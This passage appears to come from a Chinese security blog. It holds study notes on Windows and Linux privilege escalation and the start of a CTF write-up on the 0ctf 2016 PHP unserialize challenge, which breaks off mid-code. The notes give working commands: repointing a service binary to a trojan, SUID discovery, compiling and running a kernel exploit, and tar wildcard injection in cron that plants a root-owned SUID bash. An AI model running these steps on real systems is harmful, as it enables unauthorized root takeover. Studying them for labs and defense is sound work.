<h4 id="DLL劫持提权应用配合MSF"><a href="#DLL劫持提权应用配合MSF" class="headerlink" title="DLL劫持提权应用配合MSF"></a>DLL劫持提权应用配合MSF</h4><p>(复杂|鸡肋|需要特定软件在对方服务器上运行)-Web权限<br>原理<br>dll劫持提权需要特定软件应用的控制权限及启用配合<br>原理：Windows程序启动的时候需要DLL。如果这些DLL不存在，则可以通过在应用程序要查找的位置放置恶意DLL来提权。通常，Windows应用程序有其预定义好的搜索DLL的路径，它会根据下面的顺序进行搜索：<br>1、应用程序加载的目录<br>2、C:\Windows\System32<br>3、C:\Windows\System<br>4、C:\Windows<br>5、当前工作目录Current Working Directory，CWD<br>6、在PATH环境变量的目录（先系统后用户）<br>我们可以下一个火绒剑，看一下程序在运行时调用了哪些dll文件。<br><code>过程：信息收集（收集服务器上的第三方软件）-进程调试（程序在运行时调用哪些dll）-msf制作dll并上传-替换dll并在msf上监听-（管理员）启动应用后成功提权</code><br><code>dll劫持也可以配合令牌窃取获取system权限</code></p>
<h4 id="不带引号服务路径配合MSF-Web-本地权限"><a href="#不带引号服务路径配合MSF-Web-本地权限" class="headerlink" title="不带引号服务路径配合MSF-Web,本地权限"></a>不带引号服务路径配合MSF-Web,本地权限</h4><p><code>前置</code><br>C:\Program Files<br>在服务中，若不带引号且带有空格即不是“C:\Program Files”这样的，那么files会被认为是参数，程序就不能正确运行。<br><code>原理：</code><br>当Windows服务运行时，会发生以下两种情况之一。如果给出了可执行文件，并且引用了完整路径，则系统会按字面解释它并执行。但是，如果服务的二进制路径未包含在引号中，则操作系统将会执行找到的空格分隔的服务路径的第一个实例。<br><code>过程：</code><br>检测引号服务路径-利用路径制作文件并上传-启用服务（得是管理员用户-什么类型的用户启动，对应的就是什么权限）或重启-调用后成功<br><code>如何检测引号服务路径？</code></p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">cmd执行：</span><br><span class="line">wmic service get name,displayname,pathname,startmode |findstr /i <span class="string">&quot;Auto&quot;</span> |findstr /i /v <span class="string">&quot;C:\Windows\\&quot;</span>|findstr /i /v <span class="string">&quot;&quot;</span><span class="string">&quot;</span></span><br></pre></td></tr></table></figure>
<p>会自动返回调用执行程序时没用引号的，而且还需要在其中找出路径中有空格的。<br><code>continue</code><br>然后继续往下走，把生成的后门文件（.exe）名字换成空格前面，放进对应的硬盘，在启动服务或重启时，系统就会认为空格前面的是程序，后面全都是参数，故而执行了这个后门文件，完成提权。</p>
<h4 id="不安全的服务权限配合MSF-本地权限"><a href="#不安全的服务权限配合MSF-本地权限" class="headerlink" title="不安全的服务权限配合MSF-本地权限"></a>不安全的服务权限配合MSF-本地权限</h4><p><code>原理：</code>即使正确引用了服务路径，也可能存在其他漏洞。由于管理配置错误，用户可能对服务拥有过多的权限，例如，可以直接修改它导致重定向执行文件。<br><code>过程：</code>检测服务权限配置-制作文件并上传-更改服务路径指向-调用后成功<br><code>检测服务权限配置（查看当前用户（组）有哪些权限--执行命令检测，检测当前用户可以操作的服务项）:</code></p>
<figure class="highlight stylus"><table><tr><td class="code"><pre><span class="line">accesschk<span class="selector-class">.exe</span> -uwcqv <span class="string">&quot;[你可以操作的用户组]&quot;</span> *</span><br></pre></td></tr></table></figure>
<p>返回的是当前组可以操作的服务，没有则失败（直接可以结束了）<br><code>制作文件并上传：</code>上传木马文件<br><code>更改服务路径指向：</code>将一个有权限操作的服务项的路径指向更改为木马</p>
<figure class="highlight routeros"><table><tr><td class="code"><pre><span class="line">sc<span class="built_in"> config </span><span class="string">&quot;[服务项名]&quot;</span> <span class="attribute">binpath</span>=<span class="string">&quot;[木马文件和它的完整路径]&quot;</span></span><br></pre></td></tr></table></figure>
<p><code>调用后成功：</code>注意调用的是服务项</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">sc</span> <span class="built_in">start</span> <span class="string">&quot;[服务名]&quot;</span></span><br></pre></td></tr></table></figure>
<h2 id="总结Windows提权知识点："><a href="#总结Windows提权知识点：" class="headerlink" title="总结Windows提权知识点："></a>总结Windows提权知识点：</h2><p><code>提权方法对应层面</code><br>Web：SYSTEM&gt;Administrators&gt;Users&gt;default apppool（web权限）<br>本地：域管理员&gt;计算机用户（一般在内网渗透）<br><code>不同的提权方法用在不同的层面:</code>web&#x2F;本地<br><code>提权方法对应系统版本</code><br>有些方法只针对部分系统<br><code>相关文件及后门免杀问题等</code><br>防止木马文件被杀毒、安全软件干掉</p>
<h1 id="对linux操作系统进行分析"><a href="#对linux操作系统进行分析" class="headerlink" title="对linux操作系统进行分析"></a>对linux操作系统进行分析</h1><h2 id="linux系统提权-内核漏洞-SUID-信息收集"><a href="#linux系统提权-内核漏洞-SUID-信息收集" class="headerlink" title="linux系统提权|内核漏洞|SUID|信息收集"></a>linux系统提权|内核漏洞|SUID|信息收集</h2><h3 id="大纲"><a href="#大纲" class="headerlink" title="大纲"></a>大纲</h3><p><code>环境：</code>和windows一样，分为web与本地权限。<br><img src="https://pic.imgdb.cn/item/656af32ac458853aef03f70f.webp"></p>
<h3 id="具体分析-3"><a href="#具体分析-3" class="headerlink" title="具体分析"></a>具体分析</h3><h4 id="信息收集"><a href="#信息收集" class="headerlink" title="信息收集"></a>信息收集</h4><p><code>1、手工(敲命令行)|脚本</code><br>这里直接介绍用自动脚本收集信息(好东西)<br>两个信息收集：LinEnum、linuxprivchecker<br>两个漏洞探针：linux-exploit-suggester、linux-exploit-suggester2<br><code>信息收集有什么用？</code><br>信息收集为后续提权做准备<br><code>漏洞探针又有什么用？</code><br>主要用于内核提权，判定操作系统上可能存在的漏洞<br><code>2、LinEnum</code><br>需要通过webshell权限或文件上传权限上传“LinEnum.sh”到“tmp”文件夹下,执行即可<br><code>3、linuxprivchecker</code><br>需要通过webshell权限或文件上传权限上传“linuxprivchecker.py”到“tmp”文件夹下，还需要目标机器上有python<br>来到“tmp”目录下，执行文件python linuxprivchecker.py<br><code>4、linux-exploit-suggester</code><br>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester.sh”到“tmp”文件夹下<br>来到“tmp”目录下，执行文件<br>.&#x2F;linux-exploit-suggester.sh|sh linux-exploit-suggester.sh<br><code>5、linux-exploit-suggester2</code><br>需要通过webshell权限或文件上传权限上传“linux-exploit-suggester-2.pl”到“tmp”文件夹下，还需要目标机器上有perl（一种脚本语言）<br>来到“tmp”目录下，执行文件<br>perl linux-exploit-suggester-2.pl</p>
<h4 id="SUID提权"><a href="#SUID提权" class="headerlink" title="SUID提权"></a>SUID提权</h4><p>SUID<br>SUID是一种特殊权限。设置了SUID的程序文件，在用户执行该程序时，用户的权限是该程序文件属主的权限。<br>比如“&#x2F;usr&#x2F;bin&#x2F;passwd”文件，普通用户执行它时，本来是以普通用户的权限启动的；chomd u+s后，获得了root权限，从而能够更改密码。<br><code>SUID提权：就是用户跨越了权限进行执行</code><br>“chmod u+s [文件名]”给予suid权限，“u-s”删除<br><a href="https://zhuanlan.zhihu.com/p/166468556">https://zhuanlan.zhihu.com/p/166468556</a><br><code>具体该怎么用</code><br>漏洞成因：存在有SUID权限的全局命令（如复制、查找）<br>提权过程：探针是否有SUID(手工或脚本)-特定SUID利用-利用吃瓜<br>确定是否有SUID，利用脚本或下面的命令手工确定<br>    find &#x2F; -user root -perm -4000 -print 2&gt;&#x2F;dev&#x2F;null<br>    find &#x2F; -perm -u&#x3D;s -type f 2&gt;&#x2F;dev&#x2F;null<br>    find &#x2F; -user root -perm -4000 -exec ls -ldb {} ;<br>在找出来的SUID中找Nmap、Vim、find、Bash、More、Less、Nano、cp–<code>原理就是这几个命令如果被赋予了suid，那么就算是普通用户输入这几句话，也会以root权限打开，这就造成了提权。</code><br><code>题外话：看课的时候，看到可以用冰蝎连接靶机的后门，然后直接反弹shell到攻击机(nc)。</code><br>大牛文章（关于SUID提权详细操作）:<a href="https://pentestlab.blog/2017/09/25/suid-executables/">https://pentestlab.blog/2017/09/25/suid-executables/</a></p>
<h4 id="内核漏洞提权"><a href="#内核漏洞提权" class="headerlink" title="内核漏洞提权"></a>内核漏洞提权</h4><p><code>Linux提权本地配合内核漏洞（exp利用）-p62：40：00</code><br>提权过程：本地用户连接-获取可利用漏洞-下载或上传EXP-编译EXP-给权限执行-提权成功<br>连接，下载或上传探测漏洞的脚本，并运行<br>根据提示的漏洞信息下载或上传EXP，这里EXP文件的名字叫“45010.c”，使用EXP</p>
<figure class="highlight llvm"><table><tr><td class="code"><pre><span class="line">gcc <span class="number">45010</span>.<span class="keyword">c</span> -o <span class="number">45010</span></span><br><span class="line">chmod +<span class="keyword">x</span> <span class="number">45010</span></span><br><span class="line">./<span class="number">45010</span></span><br></pre></td></tr></table></figure>
<p>最后确定是否提权成功<br>id</p>
<h2 id="linux系统提权-定时任务-环境变量-数据库"><a href="#linux系统提权-定时任务-环境变量-数据库" class="headerlink" title="linux系统提权|定时任务|环境变量|数据库"></a>linux系统提权|定时任务|环境变量|数据库</h2><p>Linux权限<br>用户的权限用“id”命令来查看，权限分为uid、gid、groups，即属主、属组、其他<br>文件的权限又分为rwx，即读、写、执行，由三组二进制数据表示</p>
<h3 id="Linux提权本地环境变量安全（配合SUID）"><a href="#Linux提权本地环境变量安全（配合SUID）" class="headerlink" title="Linux提权本地环境变量安全（配合SUID）"></a>Linux提权本地环境变量安全（配合SUID）</h3><p>背景：sh是一个系统命令，正常来说，用户要使用的话直接sh就可以调用，但是我尝试了一下，在bin目录下，sh和.&#x2F;sh都可以调出sh界面；但是在其他目录下，.&#x2F;sh不能成功执行。原因就是环境变量的问题，设置的环境变量就是sh对应到&#x2F;bin目录下的sh可执行文件，而.&#x2F;sh是执行当前目录下的sh文件。<br><code>提权条件：系统的某一条指令复制了SUID权限（参考SUID提权），还需要本地用户权限</code><br>提权原理：借环境变量的执行顺序，替换了高权限的命令，获取权限。<br>替换命令的方法是借助环境变量会逐个文件夹找命令的运行逻辑，在被执行的命令之前就加一个同名的环境变量<br>提权过程：手写调用文件-编译-复制文件（默认被指向的，中转–自己上传的文件执行，自己上传的三者都要给予SUID权限–777）-增加环境变量-执行触发</p>
<h3 id="Linux提权本地定时任务安全"><a href="#Linux提权本地定时任务安全" class="headerlink" title="Linux提权本地定时任务安全"></a>Linux提权本地定时任务安全</h3><p>（通过恶意篡改定时任务实现SUID提权）<br><code>第一种：</code>命令问题（WS注入，主要是参数可以实现自定义）<br>提权条件：有通配符的可以调用其他命令的命令被放入计划任务中，而且命令支持存在参数<br>提权原理：利用通配符配合命令参数自定义命令实现提权<br>可以将通配符所匹配的内容写成命令的参数，调用其他命令<br>比如说，一个定时备份的脚本要备份某一个目录的所有文件，</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line"> cd <span class="regexp">/home/u</span>ndead<span class="regexp">/script;tar czf /</span>tmp/backup.tar.gz *</span><br></pre></td></tr></table></figure>
<p>注意到上面那个*了吗，意思是所有文件。想象一下，假设有两个文件都为空，–checkpoint-action&#x3D;exec&#x3D;sh test.sh（执行）和–checkpoint&#x3D;1（显示进度）是要被打包的，这两个文件在打包的命令就会成为打包命令的参数，而–checkpoint-action&#x3D;exec&#x3D;sh test.sh是为了执行test.sh这个文件。<br>生成test.sh:</p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">echo <span class="string">&#x27;cp /bin/bash /tmp/bash; chmod +s /tmp/bash&#x27;</span> &gt; <span class="regexp">/home/u</span>ndead<span class="regexp">/script/</span>test.sh/</span><br></pre></td></tr></table></figure>
<p>test.sh的内容：</p>
<figure class="highlight jboss-cli"><table><tr><td class="code"><pre><span class="line"><span class="keyword">echo</span> &#x27;cp <span class="string">/bin/bash</span> <span class="string">/tmp/bash</span>; chmod +s <span class="string">/tmp/bash</span>&#x27;</span><br></pre></td></tr></table></figure>
<p>就帮助我们以root去执行上述命令了，接下来调用已经获得root权限的bash</p>
<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line">./bash -p</span><br></pre></td></tr></table></figure>
<p>完成提权。<br><code>第二种：</code>权限问题<br>提权原理：利用不安全的权限分配操作导致的定时文件覆盖<br>管理员没有正确的赋予权限，比如给了文件777的权限，导致定时任务（一般是sh脚本）可以被修改，那我们就可以插入恶意代码。<br><code>第三种：</code>路径问题<br>提权原理：利用计划任务指向的文件的相对路径解析问题<br>计划任务使用相对路径来指定命令时，默认路径是“&#x2F;usr&#x2F;local&#x2F;bin”。在当前用户的目录下创建相同名字的文件，会比默认路径优先级更高</p>
<h2 id="Linux提权提升简单总结归类"><a href="#Linux提权提升简单总结归类" class="headerlink" title="Linux提权提升简单总结归类"></a>Linux提权提升简单总结归类</h2><p>1.提权环境（web环境、本地环境），信息收集（SUID、定时任务、可能漏洞、第三方服务应用等）<br>2.最新相关漏洞要明确（因为工具不可能第一时间更新），二次开发相关脚本学会展望（四个脚本）<br>3.最新漏洞：本地searchsploit脚本及远程exploitdb站点搜索说明（简要使用）<br>4.其他提权方法如：密码复用，guid，sudo等说明（运气，同理，鸡肋等） </p>
<p><code>资源：</code><br>火绒剑（HRSword）：<a href="https://www.sdbeta.com/wg/2020/0628/235361.html">https://www.sdbeta.com/wg/2020/0628/235361.html</a><br>AccessChk：<a href="https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk">https://docs.microsoft.com/en-us/sysinternals/downloads/accesschk</a><br>exploit database：<a href="https://www.exploit-db.com/">https://www.exploit-db.com/</a><br>RAVEN: 2（vulnhub的靶场）：<a href="https://www.vulnhub.com/entry/raven-2,269/">https://www.vulnhub.com/entry/raven-2,269/</a> </p>
]]></content>
      <categories>
        <category>权限提升</category>
      </categories>
      <tags>
        <tag>权限提升</tag>
      </tags>
  </entry>
  <entry>
    <title>0ctf_2016_unserialize|Recording</title>
    <url>/2023/11/06/phpfanxiuNAn/</url>
    <content><![CDATA[<h2 id="0ctf-2016-unserialize–-目录扫描-代码审计-php反序列化"><a href="#0ctf-2016-unserialize–-目录扫描-代码审计-php反序列化" class="headerlink" title="0ctf_2016_unserialize–|目录扫描|代码审计|php反序列化"></a>0ctf_2016_unserialize–|目录扫描|代码审计|php反序列化</h2><p><code>为什么我要单独把这一题拎出来讲呢,主要是这道题太恶心了,由于我水平有限,琢磨了一天才搞懂。但是学校的题库时表示有毛病啊,解出来flag还不给看？</code></p>
<h3 id="目录扫描"><a href="#目录扫描" class="headerlink" title="目录扫描"></a>目录扫描</h3><p>打开靶机,是一个登陆界面<br><img src="https://pic.imgdb.cn/item/654854eec458853aefa3aee1.jpg"><br>查看源码,只知道账号密码是以post方式提交的,除此之外一无所获。<br>尝试着抓包,看看有没有隐藏一些秘密,但是看来看去看不出端倪。<br>然后尝试目录扫描,挨个点开,发现一个疑似源码的压缩包,下载到本地,先尝试着这几个文件都访问一遍。<br><img src="https://pic.imgdb.cn/item/65485514c458853aefa40944.jpg"><br>登陆界面<br><img src="https://pic.imgdb.cn/item/654854eec458853aefa3aee1.jpg"><br>注册界面<br><img src="https://pic.imgdb.cn/item/6548552fc458853aefa44339.jpg"><br>更改信息界面提示要我们登录先,那我们先注册一个用户。<br><img src="https://pic.imgdb.cn/item/65485539c458853aefa45aee.jpg"><br><img src="https://pic.imgdb.cn/item/65485547c458853aefa47940.jpg"><br>更新界面<br><img src="https://pic.imgdb.cn/item/65485559c458853aefa49d75.jpg"></p>
<h3 id="代码审计"><a href="#代码审计" class="headerlink" title="代码审计"></a>代码审计</h3><p>到这里,基本这几个操作,注册、登录、更新我们都知道了,接下来开始愉快的代码审计了。<br><del>首先我们登陆的时候,会调用index.php验证,而在index.php有这样一句代码:require_once(‘class.php’);这个函数的意义:在php中，require_once语句用于引用或包含外部的一个php文件，语法“require_once(filename)”或“require_once ‘filename’”；如果该语句指定的文件已经被包含过，则不会再次包含。我觉得在执行index.php时会先执行class.php,但是好像不是这样的(php菜鸟一枚)。</del><br><code>index.php</code></p>
<figure class="highlight awk"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">	require_once(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>]) &#123;</span><br><span class="line">		header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">		<span class="keyword">exit</span>;<span class="regexp">//</span>session凭证直接免登录</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>] &amp;&amp; <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>]) &#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">		<span class="variable">$password</span> = <span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$username</span>) &lt; <span class="number">3</span> or strlen(<span class="variable">$username</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			die(<span class="string">&#x27;Invalid user name&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(strlen(<span class="variable">$password</span>) &lt; <span class="number">3</span> or strlen(<span class="variable">$password</span>) &gt; <span class="number">16</span>) </span><br><span class="line">			die(<span class="string">&#x27;Invalid password&#x27;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">if</span>(<span class="variable">$user</span>-&gt;login(<span class="variable">$username</span>, <span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] = <span class="variable">$username</span>;</span><br><span class="line">			header(<span class="string">&#x27;Location: profile.php&#x27;</span>);</span><br><span class="line">			<span class="keyword">exit</span>;	</span><br><span class="line">		&#125;<span class="regexp">//</span>登陆成功</span><br><span class="line">		<span class="keyword">else</span> &#123;</span><br><span class="line">			die(<span class="string">&#x27;Invalid user name or password&#x27;</span>);</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">?&gt;</span><br></pre></td></tr></table></figure>
<p>这个应该就是登录页面，输入账号和密码，如果正确，那就跳转到profile.php页面，就是显示个人信息的页面。<br><code>register.php</code><br>注册页面,就是简单的注册,没有可疑点。<br><code>update.php</code><br>更改信息界面,需要满足一定正则过滤规则才可以更改。<br><code>profile.php</code></p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">	<span class="keyword">require_once</span>(<span class="string">&#x27;class.php&#x27;</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>] == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="keyword">die</span>(<span class="string">&#x27;Login First&#x27;</span>);	</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="variable">$username</span> = <span class="variable">$_SESSION</span>[<span class="string">&#x27;username&#x27;</span>];</span><br><span class="line">	<span class="variable">$profile</span>=<span class="variable">$user</span>-&gt;<span class="title function_ invoke__">show_profile</span>(<span class="variable">$username</span>);</span><br><span class="line">	<span class="keyword">if</span>(<span class="variable">$profile</span>  == <span class="literal">null</span>) &#123;</span><br><span class="line">		<span class="title function_ invoke__">header</span>(<span class="string">&#x27;Location: update.php&#x27;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">else</span> &#123;</span><br><span class="line">		<span class="variable">$profile</span> = <span class="title function_ invoke__">unserialize</span>(<span class="variable">$profile</span>);</span><br><span class="line">		<span class="variable">$phone</span> = <span class="variable">$profile</span>[<span class="string">&#x27;phone&#x27;</span>];</span><br><span class="line">		<span class="variable">$email</span> = <span class="variable">$profile</span>[<span class="string">&#x27;email&#x27;</span>];</span><br><span class="line">		<span class="variable">$nickname</span> = <span class="variable">$profile</span>[<span class="string">&#x27;nickname&#x27;</span>];</span><br><span class="line">		<span class="variable">$photo</span> = <span class="title function_ invoke__">base64_encode</span>(<span class="title function_ invoke__">file_get_contents</span>(<span class="variable">$profile</span>[<span class="string">&#x27;photo&#x27;</span>]));</span><br><span class="line">    &#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
<p>看到unserialize,就要注意了。可以知道,profile.php内的操作数据,来自于update.php,那么,应该有这样的思路:<code>在update.php传入序列化数据（payload）,是否可以实现获取flag</code><br>继续看,发现</p>
<figure class="highlight reasonml"><table><tr><td class="code"><pre><span class="line">$photo = base64<span class="constructor">_encode(<span class="params">file_get_contents</span>($<span class="params">profile</span>[&#x27;<span class="params">photo</span>&#x27;])</span>);</span><br></pre></td></tr></table></figure>
<p>因为flag一般在一个文件中，要想知道flag，一般需要读取(php伪协议或php函数)，这里有文件读取功能的函数file_get_contents（）引起了我的注意，我就想，会不会是这个地方能够读取到flag呢？可能也就是说，我们要修改 profile 中的 photo 来读取flag。还有几个文件没有看,我们继续看。<br>class.php</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">require</span>(<span class="string">&#x27;config.php&#x27;</span>);</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span> <span class="keyword">extends</span> <span class="title">mysql</span></span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$table</span> = <span class="string">&#x27;users&#x27;</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">is_exists</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">register</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$key_list</span> = <span class="title function_ invoke__">Array</span>(<span class="string">&#x27;username&#x27;</span>, <span class="string">&#x27;password&#x27;</span>);</span><br><span class="line">		<span class="variable">$value_list</span> = <span class="title function_ invoke__">Array</span>(<span class="variable">$username</span>, <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>));</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">insert</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$key_list</span>, <span class="variable">$value_list</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">login</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$password</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$password</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$password</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">if</span> (<span class="variable">$object</span> &amp;&amp; <span class="variable">$object</span>-&gt;password === <span class="title function_ invoke__">md5</span>(<span class="variable">$password</span>)) &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">true</span>;</span><br><span class="line">		&#125; <span class="keyword">else</span> &#123;</span><br><span class="line">			<span class="keyword">return</span> <span class="literal">false</span>;</span><br><span class="line">		&#125;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">show_profile</span>(<span class="params"><span class="variable">$username</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="variable">$object</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">select</span>(<span class="variable">$this</span>-&gt;table, <span class="variable">$where</span>);</span><br><span class="line">		<span class="keyword">return</span> <span class="variable">$object</span>-&gt;profile;</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update_profile</span>(<span class="params"><span class="variable">$username</span>, <span class="variable">$new_profile</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$username</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$username</span>);</span><br><span class="line">		<span class="variable">$new_profile</span> = <span class="built_in">parent</span>::<span class="title function_ invoke__">filter</span>(<span class="variable">$new_profile</span>);</span><br><span class="line"></span><br><span class="line">		<span class="variable">$where</span> = <span class="string">&quot;username = &#x27;<span class="subst">$username</span>&#x27;&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="built_in">parent</span>::<span class="title function_ invoke__">update</span>(<span class="variable">$this</span>-&gt;table, <span class="string">&#x27;profile&#x27;</span>, <span class="variable">$new_profile</span>, <span class="variable">$where</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">		<span class="keyword">return</span> __class__;</span><br><span class="line">	&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">mysql</span> </span>&#123;</span><br><span class="line">	<span class="keyword">private</span> <span class="variable">$link</span> = <span class="literal">null</span>;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">connect</span>(<span class="params"><span class="variable">$config</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable language_">$this</span>-&gt;link = <span class="title function_ invoke__">mysql_connect</span>(</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;hostname&#x27;</span>],</span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;username&#x27;</span>], </span><br><span class="line">			<span class="variable">$config</span>[<span class="string">&#x27;password&#x27;</span>]</span><br><span class="line">		);</span><br><span class="line">		<span class="title function_ invoke__">mysql_select_db</span>(<span class="variable">$config</span>[<span class="string">&#x27;database&#x27;</span>]);</span><br><span class="line">		<span class="title function_ invoke__">mysql_query</span>(<span class="string">&quot;SET sql_mode=&#x27;strict_all_tables&#x27;&quot;</span>);</span><br><span class="line"></span><br><span class="line">		<span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;link;</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">select</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$where</span>, <span class="variable">$ret</span> = <span class="string">&#x27;*&#x27;</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;SELECT <span class="subst">$ret</span> FROM <span class="subst">$table</span> WHERE <span class="subst">$where</span>&quot;</span>;</span><br><span class="line">		<span class="variable">$result</span> = <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>, <span class="variable">$this</span>-&gt;link);</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_fetch_object</span>(<span class="variable">$result</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">insert</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key_list</span>, <span class="variable">$value_list</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$key</span> = <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;,&#x27;</span>, <span class="variable">$key_list</span>);</span><br><span class="line">		<span class="variable">$value</span> = <span class="string">&#x27;\&#x27;&#x27;</span> . <span class="title function_ invoke__">implode</span>(<span class="string">&#x27;\&#x27;,\&#x27;&#x27;</span>, <span class="variable">$value_list</span>) . <span class="string">&#x27;\&#x27;&#x27;</span>; </span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;INSERT INTO <span class="subst">$table</span> (<span class="subst">$key</span>) VALUES (<span class="subst">$value</span>)&quot;</span>;</span><br><span class="line">		<span class="keyword">return</span> <span class="title function_ invoke__">mysql_query</span>(<span class="variable">$sql</span>);</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	<span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">update</span>(<span class="params"><span class="variable">$table</span>, <span class="variable">$key</span>, <span class="variable">$value</span>, <span class="variable">$where</span></span>) </span>&#123;</span><br><span class="line">		<span class="variable">$sql</span> = <span class="string">&quot;UPDATE <span class="subst">$table</span> SET <span class="subst">$key</span> = &#x27;<span class="subst">$value</span>&#x27; WHERE <span 